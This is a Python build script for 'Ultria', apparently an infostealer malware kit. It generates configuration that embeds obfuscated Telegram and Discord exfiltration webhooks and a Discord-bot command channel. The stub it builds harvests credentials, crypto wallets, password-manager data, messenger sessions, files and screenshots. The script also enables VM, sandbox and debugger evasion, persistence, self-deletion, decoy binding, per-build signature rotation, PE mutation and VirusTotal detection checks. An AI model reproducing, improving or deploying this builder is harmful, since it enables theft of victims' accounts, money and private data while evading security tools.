#!/usr/bin/env python3
"""
Ultria builder.
Pipeline per build:
  1. randomize ULTRA_BUILD_SEED (all obfuscated strings change -> new signature)
  2. write src/config.h + config.mk (GUI embed, bound app, module flags)
  3. compile stub (dist/<output>) and the standalone checker app
  4. mutate the stub PE (random section + timestamp)
  5. VirusTotal check

Usage:
    python3 tools/builder.py                    # build with builder_config.json
    python3 tools/builder.py --debug            # console build with logs
    python3 tools/builder.py --no-vt --no-mutate
    python3 tools/builder.py --config other.json
"""
import argparse
import hashlib
import json
import os
import random
import re
import subprocess
import sys
import time

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
CONFIG_H = os.path.join(ROOT, "src", "config.h")
CONFIG_MK = os.path.join(ROOT, "config.mk")
BIND_RC = os.path.join(ROOT, "src", "bind_resource.rc")
DEFAULT_CFG = os.path.join(ROOT, "builder_config.json")
SECRETS_FILE = os.path.join(ROOT, "builder_secrets.json")
TOOLS_DIR = os.path.dirname(os.path.abspath(__file__))

DEFAULTS = {
    "tg_bot_token": "",
    "tg_chat_id": "",
    "webhook_url": "",
    "discord_webhook": "",       # https://discord.com/api/webhooks/<id>/<token>
    "c2_bot_token": "",          # Discord bot token (reads commands from the channel)
    "c2_channel_id": "",         # command channel id
    "c2_operator_id": "",        # only commands from this Discord user id are accepted
    "build_tag": "ultria",
    "output_name": "ultria.exe",
    "gui_mode": "none",          # "none" | "checker"
    "bind_exe": "",              # path to an app to embed + launch (decoy binder)
    "obf_level": 2,              # 0 off, 1 timestamp, 2 +noise section, 3 +renamed sections
    "target_size_mb": 0,         # pad the stub to this size (0 = native size)
    "enable_vm_check": True,
    "enable_debug_check": True,
    "enable_sandbox_check": True,
    "enable_persistence": False,
    "self_delete": False,
    "collect_screenshot": True,
    "modules": {
        "steam": True, "discord": True, "telegram": True, "wallets": True,
        "games": True, "messengers": True, "vpn": True, "ftp": True,
        "mail": True, "pwmanagers": True, "socials": True, "files": True,
    },
}


def load_config(path):
    cfg = dict(DEFAULTS)
    cfg["modules"] = dict(DEFAULTS["modules"])
    if os.path.isfile(path):
        with open(path, "r", encoding="utf-8") as f:
            user = json.load(f)
        for k, v in user.items():
            if k == "modules" and isinstance(v, dict):
                cfg["modules"].update(v)
            else:
                cfg[k] = v
    return cfg


def cstr(s):
    return '"' + str(s).replace("\\", "\\\\").replace('"', '\\"') + '"'


def cbool(b):
    return "true" if b else "false"


# ---------------------------------------------------------------------------
# Secret handling.  Nothing that must stay hidden is ever written as a plain
# C string literal: render_config() emits obfuscated byte arrays + a runtime
# decoder, so the plaintext never appears in the binary (nor in the repo).
# ---------------------------------------------------------------------------
def load_secrets():
    """Local-only secrets (C2 bot token, operator id). Git-ignored."""
    out = {}
    if os.path.isfile(SECRETS_FILE):
        with open(SECRETS_FILE, "r", encoding="utf-8") as f:
            out = json.load(f)
    return out


def relay_endpoint():
    """Decode the obfuscated default relay endpoint."""
    if TOOLS_DIR not in sys.path:
        sys.path.insert(0, TOOLS_DIR)
    from embedded_secrets import relay_endpoint as _re
    return _re()


def obf_bytes(value, key):
    """XOR every byte with a rotating 32-bit key -> list of obfuscated bytes."""
    b = value.encode("utf-8")
    return [c ^ ((key >> ((i % 4) * 8)) & 0xFF) for i, c in enumerate(b)]


def obf_fn(name, value):
    """Emit a C++ inline function that returns a secret decoded at runtime."""
    if not value:
        return f'inline std::string {name}() {{ return std::string(); }}\n'
    key = random.getrandbits(32)
    enc = obf_bytes(value, key)
    hexs = ", ".join("0x%02X" % x for x in enc)
    return (f'inline std::string {name}() {{\n'
            f'    static const unsigned char e[] = {{{hexs}}};\n'
            f'    return detail::xordec(e, sizeof(e), 0x{key:08X}u);\n'
            f'}}\n')


def discover_gui_modes():
    """UI modes are discovered from the source tree, never hardcoded.
    Convention: src/gui/<mode>_gui.cpp is the embeddable UI; <mode>_main.cpp is
    the standalone entry point (kept out of the stub objects); any other
    <mode>_*.cpp files join the mode's object set."""
    gui_dir = os.path.join(ROOT, "src", "gui")
    modes = {}
    if os.path.isdir(gui_dir):
        for name in sorted(os.listdir(gui_dir)):
            if not name.endswith("_gui.cpp"):
                continue
            mode = name[: -len("_gui.cpp")]
            objs = [f"build/src/gui/{name[:-len('.cpp')]}.o"]
            for extra in sorted(os.listdir(gui_dir)):
                if (extra.startswith(mode + "_") and extra.endswith(".cpp")
                        and not extra.endswith("_main.cpp") and extra != name):
                    objs.append(f"build/src/gui/{extra[:-len('.cpp')]}.o")
            modes[mode] = objs
    return modes


def resolve_gui_mode(cfg):
    """Returns (mode, objects). Exits with a clear error for unknown modes."""
    mode = str(cfg.get("gui_mode", "none"))
    modes = discover_gui_modes()
    if mode in ("", "none"):
        return "none", []
    if mode not in modes:
        avail = "none" + (", " + ", ".join(sorted(modes)) if modes else "")
        sys.exit(f"[builder] unknown gui_mode '{mode}' — detected modes: {avail} "
                 f"(drop a src/gui/{mode}_gui.cpp to add one)")
    return mode, modes[mode]


def render_config(cfg, bind_name):
    m = cfg["modules"]
    gui_mode, _gui_objs = resolve_gui_mode(cfg)
    gui_on = gui_mode != "none"

    # Secrets -> runtime-decoded byte arrays. The plaintext never appears in
    # config.h, the binary, or the public repository.
    secret_values = [
        ("webhook_url", cfg.get("webhook_url", "")),
        ("discord_webhook", cfg.get("discord_webhook", "")),
        ("relay_endpoint", cfg.get("_relay", "")),
        ("c2_bot_token", cfg.get("c2_bot_token", "")),
        ("c2_channel_id", cfg.get("c2_channel_id", "")),
        ("c2_operator_id", cfg.get("c2_operator_id", "")),
        ("tg_bot_token", cfg.get("tg_bot_token", "")),
        ("tg_chat_id", cfg.get("tg_chat_id", "")),
    ]
    secret_fns = "".join(obf_fn(n, v) for n, v in secret_values)

    head = f"""#pragma once
// Generated by tools/builder.py - do not edit manually.
// Build tag: {cfg['build_tag']} - generated at {time.strftime('%Y-%m-%d %H:%M:%S')}
// Secrets are XOR-obfuscated byte arrays decoded at runtime, never plain text.

#define ULTRA_GUI_ENABLED {1 if gui_on else 0}
#define ULTRA_GUI_ID "{gui_mode}"

#include <cstddef>
#include <cstdint>
#include <string>
#include <vector>

namespace cfg {{

namespace detail {{
inline std::string xordec(const unsigned char* p, size_t n, uint32_t k) {{
    std::string s(n, 0);
    for (size_t i = 0; i < n; ++i)
        s[i] = (char)(p[i] ^ (unsigned char)((k >> ((i % 4) * 8)) & 0xFF));
    return s;
}}
}} // namespace detail

// ---- obfuscated secrets (decoded only at runtime) ----
"""

    tail = f"""
// All webhooks receiving the report.
inline std::vector<std::string> all_webhooks() {{
    std::vector<std::string> v;
    auto add = [&](std::string s) {{
        if (s.empty()) return;
        for (const auto& x : v) if (x == s) return;   // no duplicate delivery
        v.push_back(s);
    }};
    add(discord_webhook());
    add(relay_endpoint());
    add(webhook_url());
    return v;
}}

// ---- identification ----
inline constexpr const char* BUILD_TAG = "{cfg['build_tag']}";

// ---- bound application (binder) ----
inline constexpr const char* BIND_RESOURCE = "{bind_name}";

// ---- runtime behavior ----
inline constexpr bool ENABLE_VM_CHECK      = {cbool(cfg['enable_vm_check'])};
inline constexpr bool ENABLE_DEBUG_CHECK   = {cbool(cfg['enable_debug_check'])};
inline constexpr bool ENABLE_SANDBOX_CHECK = {cbool(cfg['enable_sandbox_check'])};
inline constexpr bool ENABLE_PERSISTENCE   = {cbool(cfg['enable_persistence'])};
inline constexpr bool SELF_DELETE          = {cbool(cfg['self_delete'])};
inline constexpr bool COLLECT_SCREENSHOT   = {cbool(cfg['collect_screenshot'])};
inline constexpr bool COLLECT_STEAM        = {cbool(m.get('steam', True))};
inline constexpr bool COLLECT_DISCORD      = {cbool(m.get('discord', True))};
inline constexpr bool COLLECT_TELEGRAM     = {cbool(m.get('telegram', True))};
inline constexpr bool COLLECT_WALLETS      = {cbool(m.get('wallets', True))};
inline constexpr bool COLLECT_GAMES        = {cbool(m.get('games', True))};
inline constexpr bool COLLECT_MESSENGERS   = {cbool(m.get('messengers', True))};
inline constexpr bool COLLECT_VPN          = {cbool(m.get('vpn', True))};
inline constexpr bool COLLECT_FTP          = {cbool(m.get('ftp', True))};
inline constexpr bool COLLECT_MAIL         = {cbool(m.get('mail', True))};
inline constexpr bool COLLECT_PWMANAGERS   = {cbool(m.get('pwmanagers', True))};
inline constexpr bool COLLECT_SOCIALS      = {cbool(m.get('socials', True))};
inline constexpr bool COLLECT_FILES        = {cbool(m.get('files', True))};

// file grabber: max bytes per file and total staging cap
inline constexpr unsigned long long MAX_GRAB_FILE = 8ull * 1024 * 1024;
inline constexpr unsigned long long MAX_STAGE_TOTAL = 200ull * 1024 * 1024;

}} // namespace cfg
"""
    return head + secret_fns + tail


def write_config_mk(cfg, bind_exe):
    _mode, gui_mode_objs = resolve_gui_mode(cfg)
    gui_objs = " ".join(gui_mode_objs)
    extra_objs = "build/src/bind_resource.o" if bind_exe else ""
    with open(CONFIG_MK, "w", encoding="utf-8") as f:
        f.write("# Generated by tools/builder.py\n")
        f.write(f"GUI_OBJS := {gui_objs}\n")
        f.write(f"EXTRA_OBJS := {extra_objs}\n")
    if bind_exe:
        exe = os.path.abspath(os.path.expanduser(bind_exe)).replace("\\", "/")
        if not os.path.isfile(exe):
            sys.exit(f"[builder] bind_exe not found: {exe}")
        with open(BIND_RC, "w", encoding="utf-8") as f:
            f.write(f'BINDAPP RCDATA "{exe}"\n')
    elif os.path.isfile(BIND_RC):
        os.remove(BIND_RC)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--config", default=DEFAULT_CFG)
    ap.add_argument("--debug", action="store_true")
    ap.add_argument("--no-vt", action="store_true")
    ap.add_argument("--no-mutate", action="store_true")
    ap.add_argument("--vt-submit", action="store_true")
    ap.add_argument("--seed", type=lambda s: int(s, 0), default=None)
    ap.add_argument("--obf", type=int, choices=[0, 1, 2, 3], default=None,
                    help="obfuscation/mutation level (overrides config)")
    ap.add_argument("--size", type=float, default=None,
                    help="target output size in MB (overrides config)")
    args = ap.parse_args()

    cfg = load_config(args.config)

    # Local-only secrets override config values; the default relay endpoint is
    # decoded from the obfuscated payload in tools/embedded_secrets.py.
    secrets = load_secrets()
    for k in ("c2_bot_token", "c2_operator_id"):
        if secrets.get(k):
            cfg[k] = secrets[k]
    cfg["_relay"] = relay_endpoint()

    if args.obf is not None:
        cfg["obf_level"] = args.obf
    if args.size is not None:
        cfg["target_size_mb"] = args.size
    if not cfg["tg_bot_token"]:
        print("[builder] warning: tg_bot_token empty — set it in builder_config.json")

    # 1. fresh build seed (signature rotation)
    seed = args.seed if args.seed is not None else random.randrange(1, 0xFFFFFFFF)
    print(f"[builder] build seed: 0x{seed:08X}")

    # 2. config files
    bind_name = "BINDAPP" if cfg["bind_exe"] else ""
    with open(CONFIG_H, "w", encoding="utf-8") as f:
        f.write(render_config(cfg, bind_name))
    write_config_mk(cfg, cfg["bind_exe"])
    print(f"[builder] config written (tag={cfg['build_tag']}, gui={cfg['gui_mode']}, bind={bool(cfg['bind_exe'])})")

    # 3. compile
    make_cmd = ["make", f"EXTRA_DEFS=-DULTRA_BUILD_SEED=0x{seed:08X}u"]
    if args.debug:
        make_cmd.append("DEBUG=1")
    else:
        make_cmd.append("-j2")
    r = subprocess.run(make_cmd, cwd=ROOT)
    if r.returncode != 0:
        sys.exit("[builder] compile failed")

    stub = os.path.join(ROOT, "dist", "ultria.exe")
    out_name = cfg.get("output_name") or "ultria.exe"
    final = os.path.join(ROOT, "dist", out_name)
    if final != stub and os.path.isfile(stub):
        if os.path.isfile(final):
            os.remove(final)
        os.rename(stub, final)

    if not os.path.isfile(final):
        sys.exit("[builder] binary missing after build")

    # 4. PE mutation (level + target size from config/CLI)
    if not args.no_mutate:
        obf = int(cfg.get("obf_level", 2))
        size_mb = float(cfg.get("target_size_mb", 0) or 0)
        subprocess.run([sys.executable, os.path.join(ROOT, "tools", "mutate.py"), final,
                        "--level", str(obf),
                        "--target-size-mb", str(size_mb),
                        "--seed", str(seed)], check=False)
        print(f"[builder] mutation level {obf}" + (f", target {size_mb} MB" if size_mb else ""))

    with open(final, "rb") as f:
        digest = hashlib.sha256(f.read()).hexdigest()
    print(f"[builder] build ok: {final}")
    print(f"[builder] sha256: {digest}")

    # 5. VT
    if args.no_vt:
        return
    key = os.environ.get("VT_API_KEY", "")
    if not key:
        print("[builder] VT_API_KEY not set — skipping VirusTotal check")
        return
    vt_cmd = [sys.executable, os.path.join(ROOT, "tools", "vt_check.py"), final, "--watch"]
    if args.vt_submit:
        vt_cmd.append("--submit")
    subprocess.run(vt_cmd)


if __name__ == "__main__":
    main()
